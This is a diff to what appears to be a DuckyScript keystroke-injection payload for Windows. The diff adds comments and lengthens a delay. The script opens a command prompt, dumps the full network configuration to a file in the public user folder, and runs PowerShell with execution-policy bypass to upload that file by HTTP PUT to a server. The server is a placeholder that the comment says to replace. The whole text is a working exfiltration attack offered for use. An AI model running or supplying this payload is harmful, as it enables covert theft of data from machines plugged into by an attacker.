@@ -1,13 +1,18 @@
+REM open cmd
 WINDOWS
 DELAY 500
 STRING cmd
 DELAY 500
 ENTER
-DELAY 300
+DELAY 1500
+
+REM log network configuration to a text file
 STRING cd C:\Users\Public
 ENTER
 STRING ipconfig /all > out.txt
 ENTER
+
+REM upload file to the server (replace 127.0.0.1 with the correct server address)
 STRING powershell -ep bypass -c "$wc=New-Object Net.WebClient;$wc.UploadFile('http://127.0.0.1:8080/out.txt', 'PUT', 'C:\Users\Public\out.txt');"
 ENTER
 STRING exit
